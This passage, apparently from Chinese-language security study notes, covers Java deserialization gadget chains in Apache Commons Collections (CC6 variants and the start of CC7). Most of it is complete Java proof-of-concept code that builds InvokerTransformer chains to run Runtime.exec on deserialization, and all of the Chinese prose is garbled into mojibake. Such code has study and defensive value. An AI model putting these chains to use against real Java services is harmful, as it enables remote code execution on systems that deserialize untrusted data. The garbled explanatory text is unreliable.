<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        HashMap exphm = <span class="hljs-keyword">new</span> HashMap();<br>        exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(exphm);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ³¨æ„è¿™ä¸ªåå°„ä¿®æ”¹ä¼ å…¥çš„æ˜¯<code>Transformer[]</code>ï¼Œä¸éœ€è¦å† chain ä¸€ä¸‹äº†</p>
<p>ç°åœ¨å°±æ˜¯å¥½äº†ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆæ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼ŒæŒ‰ç€ p ç‰›æ€è·¯è°ƒè¯•ï¼Œæ–­ç‚¹<code>readObject</code>æ­¥å…¥ï¼Œ<code>LazyMap.get</code>æ–¹æ³•å†…</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220925211304382.png" srcset="/img/loading.gif" lazyload></p>
<p>if åˆ¤æ–­è¿›å»äº†è€Œæ²¡æœ‰è°ƒç”¨<code>map.get</code>ï¼Œè¿™ä¸ª<code>LazyMap</code>åœ¨å“ªé‡Œå­˜äº†å€¼å‘¢ï¼Œæ­£å¦‚ yso åˆ©ç”¨æ–¹å¼<code>HashSet.readObject-&gt;HashMap.put-&gt;HashMap.hash</code>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨è§„é¿æœ¬åœ°è§¦å‘çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿè°ƒç”¨åˆ°äº†<code>HashMap.put</code>!</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>è¿™å°±å¯¼è‡´äº†<code>yso CC6: HashSet.readObject-&gt;HashMap.put-&gt;HashMap.hash </code>åœ¨è¿™é‡Œä¹Ÿè¢«è°ƒç”¨äº†ä¸€æ¬¡ï¼Œè€Œä¸”å› ä¸ºè§„é¿ç”¨çš„<code>fakeChainedTransform</code>åœ¨è¿™é‡Œäº§ç”Ÿäº†å½±å“è€Œæ²¡æœ‰è§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œè§£å†³æ–¹æ³•ä¹Ÿç®€å•ï¼Œåœ¨åºåˆ—åŒ–å‰ç§»é™¤è¿™ä¸ªé”®</p>
<h3 id="Gadget-5"><a href="#Gadget-5" class="headerlink" title="Gadget"></a>Gadget</h3><h4 id="â‘ p-ç‰›ç®€åŒ–"><a href="#â‘ p-ç‰›ç®€åŒ–" class="headerlink" title="â‘ p ç‰›ç®€åŒ–"></a>â‘ p ç‰›ç®€åŒ–</h4><p><code>HashMap+HashMap</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        HashMap exphm = <span class="hljs-keyword">new</span> HashMap();<br>        exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br><br>        decorate.remove(<span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-comment">//        decorate.clear();</span><br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(exphm);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="â‘¡-ç™½è¢å¸ˆå‚…æ”¹-yso"><a href="#â‘¡-ç™½è¢å¸ˆå‚…æ”¹-yso" class="headerlink" title="â‘¡ ç™½è¢å¸ˆå‚…æ”¹ yso"></a>â‘¡ ç™½è¢å¸ˆå‚…æ”¹ yso</h4><p>å¾ˆåƒ yso çš„é“¾ï¼Œç…§çŒ«ç”»è™</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6EzbyBAIPAO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet();<br>        hs.add(tiedMapEntry);<br><br>        decorate.remove(<span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-comment">//        decorate.clear();</span><br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>ä½†è¿™ä¸ªé“¾å’Œ yso çš„è¿˜æ˜¯æœ‰ä¸€å®šçš„å·®è·çš„ï¼Œè¿™ä¸ªé“¾å¾€<code>LazyMap-&gt;TiedMapEntry-&gt;HashSet</code>æ·»åŠ å‡é“¾ååå°„ä¿®æ”¹ï¼Œæ€è·¯ç®€å•</p>
<h4 id="â‘¢yso"><a href="#â‘¢yso" class="headerlink" title="â‘¢yso"></a>â‘¢yso</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<span class="hljs-comment">//å¿…é¡»å¾—è®¾ç½®å€¼1 åç»­æ‰èƒ½å–å€¼map</span><br>        hs.add(<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field mapF = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        mapF.setAccessible(<span class="hljs-keyword">true</span>);<br>        HashMap hm_tmp = (HashMap) mapF.get(hs);<br><br>        Field tableF = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] arr = (Object[]) tableF.get(hm_tmp);<br><br>        Object node = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-keyword">null</span>) &#123;<br>            node = arr[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        Field keyF = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(node, tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é¦–å…ˆæ˜¯ new äº†ä¸€ä¸ªä¸º 1 çš„åˆåŒ–å®¹é‡ï¼ŒåŠ äº†ä¸€ä¸ªæ— å…³ç´§è¦çš„é”®ï¼Œé€šè¿‡åå°„å–å‡º<code>map(HashMap)</code>ï¼Œå†åå°„å–å‡º åœ¨åå°„å–å‡ºçš„<code>map</code>é‡Œé¢çš„<code>table</code>å¹¶ç½®äºä¸€ä¸ª object æ•°ç»„ï¼Œæ•°ç»„åšä¸€ä¸ªåˆ¤æ–­ï¼Œå–å‡ºéç©ºçš„[0]æˆ–[1]å…ƒç´ </p>
<p>é€šè¿‡åå°„æœ€åå°†æ·»åŠ çš„æ— å…³ç´§è¦çš„å…ƒç´ æ›¿æ¢ä¸º evil é“¾</p>
<p>æœ‰ç‚¹éš¾â€¦</p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#72fa7c88-6">https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#72fa7c88-6</a></p>
<h2 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h2><h3 id="Pre-6"><a href="#Pre-6" class="headerlink" title="Pre"></a>Pre</h3><h4 id="é™åˆ¶-6"><a href="#é™åˆ¶-6" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><blockquote>
<p>jdk æš‚æ— é™åˆ¶</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
<h4 id="åˆ©ç”¨é“¾-6"><a href="#åˆ©ç”¨é“¾-6" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.readObject</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.reconstitutionPut</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.AbstractMapDecorator</span><span class="hljs-selector-class">.equals</span><br>java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.AbstractMap</span><span class="hljs-selector-class">.equals</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span><span class="hljs-selector-class">.get</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.ChainedTransformer</span><span class="hljs-selector-class">.transform</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.InvokerTransformer</span><span class="hljs-selector-class">.transform</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span><br>sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke0</span><br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span>.exec<br></code></pre></td></tr></table></figure>

<h4 id="å…³é”®ç±»-6"><a href="#å…³é”®ç±»-6" class="headerlink" title="å…³é”®ç±»"></a>å…³é”®ç±»</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">HashTable</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure>

<p>å…ˆä¸è¯´å…·ä½“çš„é“¾ï¼Œåœ¨è¿™ä¸ªé“¾çš„åœ°æ–¹å‘ç°ä¸€ä¸ªå¾ˆæœ‰è¶£çš„ä¸œè¥¿ï¼Œå…ˆæ‹¿å‡ºæ¥è®²ï¼Œä½œçŸ¥è¯†é“ºå«</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hash</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;yy&quot;</span>.hashCode());<br>        System.out.println(<span class="hljs-string">&quot;zZ&quot;</span>.hashCode());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ªä¸œè¥¿å«<a target="_blank" rel="noopener" href="https://www.h5w3.com/164057.html">hash å†²çª</a>ï¼Œæˆ‘ä»¬çœ‹ä¸‹ä»£ç <code>String#hashCode</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> h = hash;<br>    <span class="hljs-keyword">if</span> (h == <span class="hljs-number">0</span> &amp;&amp; value.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">char</span> val[] = value;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; value.length; i++) &#123;<br>            h = <span class="hljs-number">31</span> * h + val[i];<br>        &#125;<br>        hash = h;<br>    &#125;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å¯è§æ˜¯å°† String åˆ†ä¸ºå­—ç¬¦ä¸€ä½ä¸€ä½æ ¹æ®<strong>ASCII</strong>åšä¸€ä¸ªè¿ç®—</p>
<blockquote>
<p>yyï¼šç¬¬ä¸€æ¬¡ y çš„ ascii121ï¼Œç¬¬äºŒæ¬¡ 31*121+121=3872</p>
<p>zZï¼šç¬¬ä¸€æ¬¡ z çš„ ascii122ï¼Œç¬¬äºŒæ¬¡ 31*122+90=3872</p>
</blockquote>
<p>è¿˜æœ‰å…¶ä»–çš„ï¼š</p>
<blockquote>
<p>CC == Bb<br>DD == Cc<br>BBBB == BBAa</p>
</blockquote>
<p>CC7 å‰åŠæ®µä»ç„¶æ˜¯ç”¨çš„ CC1 çš„é“¾ï¼ŒCC1 ä¸­æ˜¯é€šè¿‡<code>AnnotationInvocationHandler.invoke</code>æ¥è§¦å‘å¯¹æ¶æ„ä»£ç†<code>handler</code>è°ƒç”¨å…¶<code>invoke</code>æ–¹æ³•ä»è€Œè§¦å‘<code>LazyMap.get</code>æ–¹æ³•ï¼ŒCC7 åˆ™æ˜¯é€šè¿‡<code>AbstractMap.equals</code>æ¥è§¦å‘å¯¹<code>LazyMap.get</code>æ–¹æ³•çš„è°ƒç”¨</p>
